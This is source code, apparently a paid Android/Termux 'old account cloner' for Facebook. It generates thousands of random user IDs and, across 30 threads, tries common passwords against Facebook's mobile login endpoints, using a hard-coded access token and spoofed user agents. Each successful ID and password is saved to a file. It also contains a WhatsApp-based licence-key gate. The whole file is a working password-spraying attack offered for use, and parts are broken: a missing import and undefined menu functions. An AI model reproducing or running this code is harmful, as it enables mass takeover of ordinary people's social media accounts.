# cython: language_level=3
# cython: boundscheck=False
# cython: wraparound=False
# Author : Raja Vau (Raja Vau Teach World)
# File: Kamal.pyx (Converted to Cython for high performance and security)

import os
import sys
import time
import random
import string
import uuid
import shutil
import urllib.request
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as tred

def get_width():
    try:
        return shutil.get_terminal_size().columns
    except:
        return 45

def approval_system():
    saved_key_path = "/sdcard/RAJAVAU/saved_key.txt"
    
    if os.path.exists(saved_key_path):
        try:
            with open(saved_key_path, "r", encoding="utf-8") as f:
                saved_key = f.read().strip()
            if saved_key:
                width = max(get_width(), 40)
                padding = " " * max(0, (width - 40) // 2)
                os.system('clear' if os.name == 'posix' else 'cls')
                print("\n\n")
                print(f"{padding}\033[1;32m[✓] Key already approved! Loading tool...\033[0m")
                time.sleep(1.5)
                return
        except Exception:
            pass

    os.system("xdg-open https://youtube.com/@raja-vau-teach-world?si=KeIo3GwUzYIrmbCI 2>/dev/null")
    
    unique_id = ''.join(random.choices('0123456789ABCDEF', k=6))
    user_key = f"RajaVauTeachWorld{unique_id}"
    
    try:
        os.makedirs("/sdcard/RAJAVAU", exist_ok=True)
        with open("/sdcard/RAJAVAU/My_Key.txt", "w", encoding="utf-8") as f:
            f.write(f"{user_key}\n")
    except Exception:
        pass
    
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 56) // 2)
    
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print("\n")
        print(f"{padding}\033[1;96m    ██╗   ██╗ ██████╗ ██╗   ██╗████████╗██╗   ██╗██████╗ \033[0m")
        print(f"{padding}\033[1;93m    ╚██╗ ██╔╝██╔═══██╗██║   ██║╚══██╔══╝██║   ██║██╔══██╗\033[0m")
        print(f"{padding}\033[1;92m     ╚████╔╝ ██║   ██║██║   ██║   ██║   ██║   ██║██████╔╝\033[0m")
        print(f"{padding}\033[1;96m      ╚██╔╝  ██║   ██║██║   ██║   ██║   ██║   ██║██╔══██╗\033[0m")
        print(f"{padding}\033[1;94m       ██║   ╚██████╔╝╚██████╔╝   ██║   ╚██████╔╝██████╔╝\033[0m")
        print(f"{padding}\033[1;95m       ╚═╝    ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ ╚═════╝ \033[0m")
        print(f"{padding}\033[1;33m    ═════════════════════════════════════════════════════\033[0m")
        print(f"{padding}\033[1;92m            ✦ WELCOME TO RAJA VAU TEACH WORLD ✦          \033[0m")
        print(f"{padding}\033[1;33m    ═════════════════════════════════════════════════════\033[0m\n")
        
        print(f"{padding}\033[1;36m╔══════════════════════════════════════════════════════╗\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32mYour Key     : \033[1;33m{user_key:<22}\033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;37mSend this key to WhatsApp for approval!              \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;35mWhatsApp No  : +880 1345-294347                        \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m╚══════════════════════════════════════════════════════╝\033[0m")
        print(f"{padding}\033[1;32m [1] Join WhatsApp & Send Key to Admin\033[0m")
        print(f"{padding}\033[1;32m [2] Check Approval Status (Online)\033[0m")
        print(f"{padding}\033[1;31m [0] Exit\033[0m")
        print(f"{padding}\033[1;36m──────────────────────────────────────────────────────\033[0m")
        
        choice = input(f"{padding}\033[1;33m [-] CHOOSE : \033[0m").strip()
        
        if choice == '1':
            wa_url = f"https://wa.me/+8801345294347?text=Assalamu%20Alaikum,%20Admin!%20My%20Key%20is%3A%20{user_key}"
            os.system(f"xdg-open '{wa_url}' 2>/dev/null")
            print(f"\n{padding}\033[1;32m [+] Redirecting to WhatsApp...\033[0m")
            time.sleep(2)
        elif choice == '2':
            print(f"\n{padding}\033[1;33m [+] Checking approval status from online... \033[0m")
            time.sleep(1.5)
            
            approved = False
            try:
                raw_url = "https://raw.githubusercontent.com/Raja-Vau/Raja/refs/heads/main/approved.txt"
                req = urllib.request.Request(raw_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=5) as response:
                    data = response.read().decode('utf-8')
                    approved_keys = [line.strip() for line in data.splitlines() if line.strip()]
                    if user_key in approved_keys:
                        approved = True
            except Exception as e:
                print(f"\n{padding}\033[1;31m [!] Connection Error! Check your internet.\033[0m")
                time.sleep(2)
                continue
            
            if approved:
                try:
                    with open(saved_key_path, "w", encoding="utf-8") as f:
                        f.write(f"{user_key}\n")
                except Exception:
                    pass
                
                print(f"\n{padding}\033[1;32m [✓] Your Key is Approved! Entering tool...\033[0m")
                time.sleep(2)
                break
            else:
                print(f"\n{padding}\033[1;31m [!] Your Key is not approved yet! Please contact admin.\033[0m")
                time.sleep(2.5)
        elif choice == '0':
            print(f"\n{padding}\033[1;31m [!] Exiting tool...\033[0m")
            sys.exit()
        else:
            print(f"\n{padding}\033[1;31m [!] Invalid Choice! Try again.\033[0m")
            time.sleep(1.5)

method = []
oks = []
cps = []
loop = 0
user = []

X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'
rr = random.randint

def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])

def window1():
    aV = str(random.choice(range(10, 20)))
    r_win = random.choice(range(6, 11))
    sub_val = random.choice(['0', '1'])
    r_chrome = random.choice(range(80, 122))
    r_b1 = random.choice(range(4000, 7000))
    r_b2 = random.choice(range(50, 200))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {r_win}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{r_chrome}.0.{r_b1}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {r_win}.{sub_val}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{r_chrome}.0.{r_b1}.{r_b2} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{sub_val}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{r_chrome}.0.{r_b1}.{r_b2} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

def banner():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
        
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 55) // 2)
    
    print("\n")
    print(f"{padding}\033[1;31m  ██╗  ██╗ █████╗ ███╗   ███╗ █████╗ ██╗  \033[0m")
    print(f"{padding}\033[1;31m  ██║ ██╔╝██╔══██╗████╗ ████║██╔══██╗██║  \033[0m")
    print(f"{padding}\033[1;31m  █████╔╝ ███████║██╔████╔██║███████║██║  \033[0m")
    print(f"{padding}\033[1;31m  ██╔═██╗ ██╔══██║██║╚██╔╝██║██╔══██║██║  \033[0m")
    print(f"{padding}\033[1;31m  ██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║█████╗\033[0m\n")
    
    print(f"{padding}\033[1;36m╔═════════════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31mSTART TIME    :\033[1;32m {current_time}              \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╠═════════════════════════════════════════════════════╣\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mAdmin         :\033[1;37m Raja Vau                           \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mOwner         :\033[1;37m Raja Vau Teach World               \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mTool Type     :\033[1;37m Paid Old Cloner                    \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mYouTube       :\033[1;34m https://youtube.com/@raja-vau      \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mContact Admin :\033[1;32m +880 1345-294347                 \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚═════════════════════════════════════════════════════╝\033[0m\n")

def creationyear(uid):
    uid_str = str(uid)
    if len(uid_str) == 15:
        if uid_str.startswith('1000000000'): return '2009'
        if uid_str.startswith('100000000'): return '2009'
        if uid_str.startswith('10000000'): return '2009'
        if uid_str.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): return '2009'
        if uid_str.startswith(('1000006', '1000007', '1000008', '1000009')): return '2010'
        if uid_str.startswith('100001'): return '2010'
        if uid_str.startswith(('100002', '100003')): return '2011'
        if uid_str.startswith('100004'): return '2012'
        if uid_str.startswith(('100005', '100006')): return '2013'
        if uid_str.startswith(('100007', '100008')): return '2014'
        if uid_str.startswith('100009'): return '2015'
        if uid_str.startswith('10001'): return '2016'
        if uid_str.startswith('10002'): return '2017'
        if uid_str.startswith('10003'): return '2018'
        if uid_str.startswith('10004'): return '2019'
        if uid_str.startswith('10005'): return '2020'
        if uid_str.startswith('10006'): return '2021'
        if uid_str.startswith('10009'): return '2023'
        if uid_str.startswith(('10007', '10008')): return '2022'
        return ''
    elif len(uid_str) in (9, 10):
        return '2008'
    elif len(uid_str) == 8:
        return '2007'
    elif len(uid_str) == 7:
        return '2006'
    elif len(uid_str) == 14 and uid_str.startswith('61'):
        return '2024'
    else:
        return ''

def clear():
    os.system('clear')

def linex():
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    print(f"{padding}\033[1;36m────────────────────────────────────────────\033[0m")

def old_clone():
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    
    print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mALL SERIES                      \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37m100003/4 SERIES                 \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[3] \033[1;33m---> \033[1;37m2009 SERIES                     \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31m[0] \033[1;33m---> \033[1;37mBACK                            \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
    
    _input = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m").strip()
    if _input in ('1', '01'):
        old_One()
    elif _input in ('2', '02'):
        old_Tow()
    elif _input in ('3', '03'):
        old_Tree()
    elif _input in ('0', '00'):
        BNG_71_()
    else:
        print(f"{padding}\033[1;31m [!] OPTION NOT FOUND IN MENU...")
        time.sleep(1)
        old_clone()

def old_One():
    global user
    user = []
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    print(f"{padding}\033[1;32m [–] OLD CODE : 2010-2014\033[0m")
    ask = input(f"{padding}\033[1;32m [–] SELECT : \033[0m")
    linex()
    banner()
    print(f"{padding}\033[1;32m [–] EXAMPLE : 20000 / 30000 / 99999\033[0m")
    limit = input(f"{padding}\033[1;32m [–] SELECT : \033[0m")
    linex()
    star = '10000'
    for _ in range(int(limit) if limit.isdigit() else 20000):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    
    print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mMETHOD 1                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37mMETHOD 2                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31m[0] \033[1;33m---> \033[1;37mBACK                            \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
    
    meth = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m").strip()
    with tred(max_workers=30) as pool:
        banner()
        print(f"{padding}\033[1;32m [–] TOTAL ID FROM CRACK : {limit}\033[0m")
        print(f"{padding}\033[1;32m [–] USE AIRPLANE MOD FOR GOOD RESULT\033[0m")
        linex()
        for mal in user:
            uid = star + mal
            if meth in ('1', 'A', 'a'):
                pool.submit(login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(login_2, uid)
            elif meth in ('0', '00'):
                old_clone()
            else:
                print(f"{padding}\033[1;31m [–] INVALID METHOD SELECTED\033[0m")
                break

def old_Tow():
    global user
    user = []
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    print(f"{padding}\033[1;32m [–] OLD CODE : 2010-2014\033[0m")
    linex()
    banner()
    print(f"{padding}\033[1;32m [–] EXAMPLE : 20000 / 30000 / 99999\033[0m")
    limit = input(f"{padding}\033[1;32m [–] TOTAL ID COUNT : \033[0m")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit) if limit.isdigit() else 20000):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    
    print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mMETHOD A                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37mMETHOD B                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31m[0] \033[1;33m---> \033[1;37mBACK                            \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
    
    meth = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m").strip()
    with tred(max_workers=30) as pool:
        banner()
        print(f"{padding}\033[1;32m [–] TOTAL ID FROM CRACK : {limit}\033[0m")
        print(f"{padding}\033[1;32m [–] USE AIRPLANE MOD FOR GOOD RESULT\033[0m")
        linex()
        for uid in user:
            if meth in ('1', 'A', 'a'):
                pool.submit(login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(login_2, uid)
            elif meth in ('0', '00'):
                old_clone()
            else:
                print(f"{padding}\033[1;31m [–] INVALID METHOD SELECTED\033[0m")
                break

def old_Tree():
    global user
    user = []
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    print(f"{padding}\033[1;32m [–] OLD CODE : 2009-2010\033[0m")
    linex()
    banner()
    print(f"{padding}\033[1;32m [–] EXAMPLE : 20000 / 30000 / 99999\033[0m")
    limit = input(f"{padding}\033[1;32m [–] TOTAL ID COUNT : \033[0m")
    linex()
    prefix = '1000004'
    for _ in range(int(limit) if limit.isdigit() else 20000):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    
    print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mMETHOD A                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37mMETHOD B                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31m[0] \033[1;33m---> \033[1;37mBACK                            \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
    
    meth = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m").strip()
    with tred(max_workers=30) as pool:
        banner()
        print(f"{padding}\033[1;32m [–] TOTAL ID FROM CRACK : {limit}\033[0m")
        print(f"{padding}\033[1;32m [–] USE AIRPLANE MODE EVERY 5 MINUTES\033[0m")
        linex()
        for uid in user:
            if meth in ('1', 'A', 'a'):
                pool.submit(login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(login_2, uid)
            elif meth in ('0', '00'):
                old_clone()
            else:
                print(f"{padding}\033[1;31m [–] INVALID METHOD SELECTED\033[0m")
                break

def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA OK ID-M1\x1b[38;5;196m)(\x1b[1;37m\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA \x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/RAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r\x1b[1;37m(\x1b[1;37mRAJA VAU\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/RAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)

def login_2(uid):
    global loop
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA -M2\x1b[38;5;196m)(\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    sys.stdout.flush()

    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(random.randint(20000000, 29999999)),
                    'x-fb-sim-hni': str(random.randint(20000, 40000)),
                    'x-fb-net-hni': str(random.randint(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA XD\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/RAJA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
                elif 'session_key' in po:
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m(\x1b[1;37mRAJA \x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/RAJA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        except Exception:
            pass
    loop += 1

def BNG_71_():
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)

    print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mOLD ACCOUNT TOOL            \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37mF-B Account                 \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[3] \033[1;33m---> \033[1;37m2010 Old F-B                \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[4] \033[1;33m---> \033[1;37m2009 Old F-B                \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[5] \033[1;33m---> \033[1;37mFile cloning Old-FB         \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31m[0] \033[1;33m---> \033[1;37mEXIT                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")

    Jihad = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m").strip()
    if Jihad in ('1', '01', 'A', 'a'):
        old_clone()
    elif Jihad in ('2', '02'):
        fb_account()
    elif Jihad in ('3', '03'):
        old_2010_fb()
    elif Jihad in ('4', '04'):
        old_2009_fb()
    elif Jihad in ('5', '05'):
        file_cloning_old_fb()
    elif Jihad in ('0', '00'):
        exit("\033[1;32m━▷ THANKS FOR USE ♥")
    else:
        print(f"{padding}\033[1;31m [!] OPTION NOT FOUND IN MENU...")
        time.sleep(1)
        BNG_71_()

def fb_account():
    fb_old_clone()

def fb_old_clone():
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)

    print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mALL SERIES CLONING          \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37m100003/4 SERIES ONLY        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[3] \033[1;33m---> \033[1;37m2008-2009 SERIES ONLY       \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31m[0] \033[1;33m---> \033[1;37mBACK                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")

    _input = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m").strip()
    if _input in ('1', '01'):
        fb_old_One()
    elif _input in ('2', '02'):
        fb_old_Tow()
    elif _input in ('3', '03'):
        fb_old_Tree()
    elif _input in ('0', '00'):
        BNG_71_()
    else:
        print(f"{padding}\033[1;31m [!] OPTION NOT FOUND IN MENU...")
        time.sleep(1)
        fb_account()

def fb_old_One():
    global user
    user = []
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    print(f"{padding}\033[1;32m [–] TARGET : 2008-2014 SERIES\033[0m")
    linex()
    ask = input(f"{padding}\033[1;32m [–] SELECT : \033[0m")
    linex()
    banner()
    print(f"{padding}\033[1;32m [–] EXAMPLE : 20000 / 30000 / 99999\033[0m")
    limit = input(f"{padding}\033[1;32m [–] AMOUNT : \033[0m")
    linex()
    star = '10000'
    for _ in range(int(limit) if limit.isdigit() else 20000):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    
    banner()
    print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mMETHOD 1                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37mMETHOD 2                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31m[0] \033[1;33m---> \033[1;37mBACK                            \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
    
    meth = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m").strip()
    with tred(max_workers=30) as pool:
        banner()
        print(f"{padding}\033[1;32m [–] TOTAL ID FROM CRACK : {limit}\033[0m")
        print(f"{padding}\033[1;32m [–] USE AIRPLANE MOD FOR GOOD RESULT\033[0m")
        linex()
        for mal in user:
            uid = star + mal
            if meth in ('1', 'A', 'a'):
                pool.submit(fb_login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(fb_login_2, uid)
            else:
                print(f"{padding}\033[1;31m [–] INVALID METHOD SELECTED\033[0m")
                break

def fb_old_Tow():
    global user
    user = []
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    print(f"{padding}\033[1;32m [–] TARGET : 100003/4 SERIES\033[0m")
    linex()
    banner()
    print(f"{padding}\033[1;32m [–] EXAMPLE : 20000 / 30000 / 99999\033[0m")
    limit = input(f"{padding}\033[1;32m [–] TOTAL ID COUNT : \033[0m")
    linex()
    prefixes = ['100001', '100002', '100003', '100004', '100005']
    for _ in range(int(limit) if limit.isdigit() else 20000):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    
    banner()
    print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mMETHOD 1                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37mMETHOD 2                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31m[0] \033[1;33m---> \033[1;37mBACK                            \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
    
    meth = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m").strip()
    with tred(max_workers=30) as pool:
        banner()
        print(f"{padding}\033[1;32m [–] TOTAL ID FROM CRACK : {limit}\033[0m")
        print(f"{padding}\033[1;32m [–] USE AIRPLANE MOD FOR GOOD RESULT\033[0m")
        linex()
        for uid in user:
            if meth in ('1', 'A', 'a'):
                pool.submit(fb_login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(fb_login_2, uid)
            else:
                print(f"{padding}\033[1;31m [–] INVALID METHOD SELECTED\033[0m")
                break

def fb_old_Tree():
    global user
    user = []
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
